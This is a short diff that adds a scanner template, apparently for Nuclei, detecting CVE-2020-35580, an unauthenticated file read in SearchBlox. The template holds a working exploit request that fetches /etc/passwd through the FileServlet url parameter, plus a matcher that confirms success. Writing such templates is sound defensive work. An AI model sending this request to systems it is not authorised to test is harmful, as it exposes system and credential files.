@@ -1,0 +1,25 @@
+id: CVE-2020-35580
+
+info:
+  name: Searchblox FileServlet API File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SearchBlox versions prior to 9.2.2 have a vulnerability that allows remote, unauthenticated attackers to read arbitrary files from the operating system via /searchblox/servlet/FileServlet?url=.
+  classification:
+    cve-id: CVE-2020-35580
+
+http:
+  - raw:
+      - |
+        GET /searchblox/servlet/FileServlet?url=/etc/passwd&col=9 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(.*?):0:0:"
